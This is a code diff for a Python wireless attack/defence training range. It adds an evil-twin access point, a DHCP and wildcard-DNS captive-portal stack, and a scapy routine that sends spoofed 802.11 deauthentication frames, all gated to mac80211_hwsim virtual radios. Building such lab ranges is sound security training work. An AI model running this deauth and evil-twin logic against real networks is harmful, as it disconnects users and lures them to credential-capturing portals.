@@ -1,17 +1,28 @@
 from __future__ import annotations
 
+import json
 import os
 import shutil
 import signal
 import subprocess
+import sys
+import time
 from pathlib import Path
 
 LAB_DIR = Path("/tmp/obt-scorpion-range")
+STATE = LAB_DIR / "state.json"
 
 
-def _run(cmd: list[str], timeout: int = 12) -> tuple[int, str]:
+def _run(cmd: list[str], timeout: int = 12, env: dict | None = None) -> tuple[int, str]:
     try:
-        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=False)
+        p = subprocess.run(
+            cmd,
+            capture_output=True,
+            text=True,
+            timeout=timeout,
+            check=False,
+            env=env,
+        )
         return p.returncode, (p.stdout + p.stderr).strip()
     except Exception as exc:
         return 1, str(exc)
@@ -37,9 +48,63 @@ def _driver_name(iface: str) -> str:
         return ""
 
 
+def _mac(iface: str) -> str:
+    try:
+        return (Path("/sys/class/net") / iface / "address").read_text().strip().lower()
+    except Exception:
+        return ""
+
+
 def hwsim_interfaces() -> list[str]:
-    # Critical safety property: the training arena only accepts software radios.
     return [i for i in _all_interfaces() if _driver_name(i) == "mac80211_hwsim"]
+
+
+def _assert_hwsim(*ifaces: str) -> tuple[bool, str]:
+    for iface in ifaces:
+        if not iface or _driver_name(iface) != "mac80211_hwsim":
+            return False, f"safety lock: {iface or '<none>'} is not mac80211_hwsim"
+    return True, ""
+
+
+def _read_state() -> dict:
+    try:
+        return json.loads(STATE.read_text())
+    except Exception:
+        return {}
+
+
+def _write_state(state: dict) -> None:
+    LAB_DIR.mkdir(parents=True, exist_ok=True)
+    STATE.write_text(json.dumps(state, indent=2))
+
+
+def _kill_pidfile(name: str) -> bool:
+    p = LAB_DIR / name
+    if not p.exists():
+        return False
+    try:
+        pid = int(p.read_text().strip())
+        os.kill(pid, signal.SIGTERM)
+        time.sleep(0.05)
+    except ProcessLookupError:
+        pass
+    except Exception:
+        pass
+    try:
+        p.unlink()
+    except FileNotFoundError:
+        pass
+    return True
+
+
+def stop_lab_services() -> dict:
+    stopped = []
+    for name in ("portal.pid", "dnsmasq.pid", "ap1.pid", "ap2.pid"):
+        if _kill_pidfile(name):
+            stopped.append(name)
+    for iface in hwsim_interfaces():
+        _run(["ip", "addr", "flush", "dev", iface])
+    return {"ok": True, "stopped": stopped}
 
 
 def lab_status() -> dict:
@@ -51,40 +116,18 @@ def lab_status() -> dict:
         "phys": phys,
         "hwsim_interfaces": hwsim_interfaces(),
         "iw_status": code,
-        "twin_running": any((LAB_DIR / name).exists() for name in ("ap1.pid", "ap2.pid")),
+        "state": _read_state(),
+        "portal_events": str(LAB_DIR / "portal_events.jsonl"),
     }
 
 
-def stop_twin_demo() -> dict:
-    stopped: list[int] = []
-    errors: list[str] = []
-    for name in ("ap1.pid", "ap2.pid"):
-        p = LAB_DIR / name
-        if not p.exists():
-            continue
-        try:
-            pid = int(p.read_text().strip())
-            os.kill(pid, signal.SIGTERM)
-            stopped.append(pid)
-        except ProcessLookupError:
-            pass
-        except Exception as exc:
-            errors.append(f"{name}: {exc}")
-        finally:
-            try:
-                p.unlink()
-            except FileNotFoundError:
-                pass
-    return {"ok": not errors, "stopped_pids": stopped, "errors": errors}
-
-
-def create_virtual_radios(radios: int = 3) -> dict:
+def create_virtual_radios(radios: int = 4) -> dict:
     if os.geteuid() != 0:
         return {"ok": False, "error": "root privileges required"}
     if not shutil.which("modprobe"):
         return {"ok": False, "error": "modprobe not found"}
 
-    stop_twin_demo()
+    stop_lab_services()
     _run(["modprobe", "-r", "mac80211_hwsim"])
     code, out = _run(["modprobe", "mac80211_hwsim", f"radios={radios}"])
     status = lab_status()
@@ -107,35 +150,35 @@ logger_stdout_level=2
 
 
 def start_twin_demo(ssid: str = "OBT_LAB") -> dict:
-    """Start two same-SSID APs strictly on mac80211_hwsim software radios."""
+    """Run same-SSID APs only on software radios; no physical RF is possible."""
     if os.geteuid() != 0:
         return {"ok": False, "error": "root privileges required"}
     if not shutil.which("hostapd"):
         return {"ok": False, "error": "hostapd not installed"}
 
     ifaces = hwsim_interfaces()
-    if len(ifaces) < 3:
-        created = create_virtual_radios(3)
+    if len(ifaces) < 4:
+        created = create_virtual_radios(4)
         if not created.get("ok"):
             return created
         ifaces = hwsim_interfaces()
 
-    if len(ifaces) < 3:
-        return {"ok": False, "error": "could not obtain 3 mac80211_hwsim radios"}
+    if len(ifaces) < 4:
+        return {"ok": False, "error": "could not obtain 4 mac80211_hwsim radios"}
 
-    # Refuse physical adapters even if interface discovery changes.
-    ap1, ap2, observer = ifaces[:3]
-    if any(_driver_name(i) != "mac80211_hwsim" for i in (ap1, ap2, observer)):
-        return {"ok": False, "error": "safety check failed: non-hwsim interface detected"}
+    original, twin, observer, client = ifaces[:4]
+    safe, error = _assert_hwsim(original, twin, observer, client)
+    if not safe:
+        return {"ok": False, "error": error}
 
-    stop_twin_demo()
+    stop_lab_services()
     LAB_DIR.mkdir(parents=True, exist_ok=True)
     cfg1 = LAB_DIR / "ap1.conf"
     cfg2 = LAB_DIR / "ap2.conf"
-    cfg1.write_text(_hostapd_config(ap1, ssid, 1))
-    cfg2.write_text(_hostapd_config(ap2, ssid, 6))
+    cfg1.write_text(_hostapd_config(original, ssid, 1))
+    cfg2.write_text(_hostapd_config(twin, ssid, 6))
 
-    for iface in (ap1, ap2, observer):
+    for iface in (original, twin, observer, client):
         _run(["ip", "link", "set", iface, "down"])
         _run(["iw", "dev", iface, "set", "type", "managed"])
         _run(["ip", "link", "set", iface, "up"])
@@ -145,56 +188,201 @@ def start_twin_demo(ssid: str = "OBT_LAB") -> dict:
 
     ok = c1 == 0 and c2 == 0
     if not ok:
-        stop_twin_demo()
+        stop_lab_services()
+        return {"ok": False, "hostapd_output": [o1, o2]}
 
-    return {
-        "ok": ok,
+    state = {
         "mode": "software-radio-only",
         "ssid": ssid,
-        "legitimate_lab_ap": {"interface": ap1, "channel": 1},
-        "twin_lab_ap": {"interface": ap2, "channel": 6},
-        "observer": observer,
-        "hostapd_output": [o1, o2],
-        "note": "Both APs exist only inside mac80211_hwsim; no physical RF transmission.",
+        "original": {"interface": original, "channel": 1, "bssid": _mac(original)},
+        "twin": {"interface": twin, "channel": 6, "bssid": _mac(twin)},
+        "observer": {"interface": observer, "bssid": _mac(observer)},
+        "client": {"interface": client, "bssid": _mac(client)},
     }
+    _write_state(state)
+    return {"ok": True, **state}
+
+
+def start_captive_stack(lab_token: str = "OBT-LAB-2026") -> dict:
+    """Start DHCP, DNS wildcard redirect and portal strictly on the hwsim twin."""
+    if os.geteuid() != 0:
+        return {"ok": False, "error": "root privileges required"}
+    state = _read_state()
+    twin = state.get("twin", {}).get("interface")
+    safe, error = _assert_hwsim(twin)
+    if not safe:
+        return {"ok": False, "error": error}
+    if not shutil.which("dnsmasq"):
+        return {"ok": False, "error": "dnsmasq not installed"}
+
+    _kill_pidfile("dnsmasq.pid")
+    _kill_pidfile("portal.pid")
+    _run(["ip", "addr", "flush", "dev", twin])
+    _run(["ip", "addr", "add", "10.77.0.1/24", "dev", twin])
+    _run(["ip", "link", "set", twin, "up"])
+
+    dns_log = LAB_DIR / "dnsmasq.log"
+    code, out = _run([
+        "dnsmasq",
+        "--interface=" + twin,
+        "--bind-interfaces",
+        "--dhcp-range=10.77.0.20,10.77.0.100,255.255.255.0,1h",
+        "--dhcp-option=3,10.77.0.1",
+        "--dhcp-option=6,10.77.0.1",
+        "--address=/#/10.77.0.1",
+        "--no-resolv",
+        "--log-queries",
+        "--log-dhcp",
+        "--log-facility=" + str(dns_log),
+        "--pid-file=" + str(LAB_DIR / "dnsmasq.pid"),
+    ])
+    if code != 0:
+        return {"ok": False, "error": out or "dnsmasq failed"}
+
+    env = dict(os.environ)
+    env.update({
+        "OBT_LAB_DIR": str(LAB_DIR),
+        "OBT_LAB_TOKEN": lab_token,
+        "OBT_PORTAL_BIND": "10.77.0.1",
+        "OBT_PORTAL_PORT": "80",
+    })
+    log = (LAB_DIR / "portal.log").open("a")
+    proc = subprocess.Popen(
+        [sys.executable, "-m", "obt_scorpion.portal_server"],
+        stdout=log,
+        stderr=log,
+        env=env,
+        start_new_session=True,
+    )
+    (LAB_DIR / "portal.pid").write_text(str(proc.pid))
+
+    state["captive"] = {
+        "interface": twin,
+        "gateway": "10.77.0.1",
+        "dhcp_range": "10.77.0.20-10.77.0.100",
+        "dns_redirect": "all names -> 10.77.0.1",
+        "portal": "http://10.77.0.1/",
+        "training_token_hint": "configured at launch; submissions are never stored",
+    }
+    _write_state(state)
+    return {"ok": True, **state["captive"]}
+
+
+def lab_deauth_burst(count: int = 6) -> dict:
+    """Transmit deauth frames only inside mac80211_hwsim to the lab original AP."""
+    if os.geteuid() != 0:
+        return {"ok": False, "error": "root privileges required"}
+    state = _read_state()
+    observer = state.get("observer", {}).get("interface")
+    ap_bssid = state.get("original", {}).get("bssid")
+    safe, error = _assert_hwsim(observer)
+    if not safe:
+        return {"ok": False, "error": error}
+    allowed_bssids = {
+        state.get("original", {}).get("bssid"),
+        state.get("twin", {}).get("bssid"),
+    }
+    if not ap_bssid or ap_bssid not in allowed_bssids:
+        return {"ok": False, "error": "scope lock: AP BSSID is not a lab hwsim BSSID"}
+
+    try:
+        from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp  # type: ignore
+    except Exception:
+        return {"ok": False, "error": "python3-scapy not installed"}
+
+    _run(["ip", "link", "set", observer, "down"])
+    _run(["iw", "dev", observer, "set", "type", "monitor"])
+    _run(["ip", "link", "set", observer, "up"])
+
+    broadcast = "ff:ff:ff:ff:ff:ff"
+    frame = RadioTap() / Dot11(
+        type=0,
+        subtype=12,
+        addr1=broadcast,
+        addr2=ap_bssid,
+        addr3=ap_bssid,
+    ) / Dot11Deauth(reason=7)
+
+    sendp(frame, iface=observer, count=max(1, min(int(count), 20)), inter=0.08, verbose=False)
+
+    return {
+        "ok": True,
+        "mode": "mac80211_hwsim-only",
+        "interface": observer,
+        "target_bssid": ap_bssid,
+        "frames_sent": max(1, min(int(count), 20)),
+        "note": "No physical radio can be selected by this function.",
+    }
+
+
+def portal_events(limit: int = 20) -> list[dict]:
+    p = LAB_DIR / "portal_events.jsonl"
+    if not p.exists():
+        return []
+    rows = []
+    for line in p.read_text(errors="ignore").splitlines()[-limit:]:
+        try:
+            rows.append(json.loads(line))
+        except Exception:
+            pass
+    return rows
 
 
 def destroy_virtual_radios() -> dict:
     if os.geteuid() != 0:
         return {"ok": False, "error": "root privileges required"}
-    stopped = stop_twin_demo()
+    stopped = stop_lab_services()
     code, out = _run(["modprobe", "-r", "mac80211_hwsim"])
-    return {"ok": code == 0, "output": out, "twin_stop": stopped}
+    try:
+        STATE.unlink()
+    except FileNotFoundError:
+        pass
+    return {"ok": code == 0, "output": out, "services": stopped}
 
 
 def lab_menu() -> dict:
     print("""
-VIRTUAL WI-FI RANGE
-───────────────────
-Linux mac80211_hwsim software radios only.
-No physical RF transmission is used by this arena.
+SCORPION WIRELESS ATTACK / DEFENSE RANGE
+────────────────────────────────────────
+Hard safety boundary: mac80211_hwsim software radios only.
+No physical RF adapter can be used by active lab actions.
 
-[1] Create 3 virtual radios
-[2] Start same-SSID Evil-Twin detection arena
-[3] Show lab status
-[4] Stop twin arena
-[5] Destroy virtual radios
+[1] Create 4 virtual radios
+[2] Start same-SSID Twin Arena
+[3] Start DHCP + DNS redirect + Captive Portal
+[4] Send lab-only deauth burst
+[5] Show lab status
+[6] Show portal training events
+[7] Stop lab services
+[8] Destroy virtual radios
 [0] Back
 """)
     choice = input("lab> ").strip()
     if choice == "1":
-        result = create_virtual_radios(3)
+        result = create_virtual_radios(4)
     elif choice == "2":
         ssid = input("Lab SSID [OBT_LAB]: ").strip() or "OBT_LAB"
         result = start_twin_demo(ssid)
     elif choice == "3":
-        result = lab_status()
+        token = input("Training token [OBT-LAB-2026]: ").strip() or "OBT-LAB-2026"
+        result = start_captive_stack(token)
     elif choice == "4":
-        result = stop_twin_demo()
+        raw = input("Frame count [6, max 20]: ").strip() or "6"
+        try:
+            count = int(raw)
+        except ValueError:
+            count = 6
+        result = lab_deauth_burst(count)
     elif choice == "5":
+        result = lab_status()
+    elif choice == "6":
+        result = {"ok": True, "events": portal_events()}
+    elif choice == "7":
+        result = stop_lab_services()
+    elif choice == "8":
         result = destroy_virtual_radios()
     else:
         result = {"ok": True, "action": "back"}
 
-    print(result)
+    print(json.dumps(result, indent=2, ensure_ascii=False))
     return result
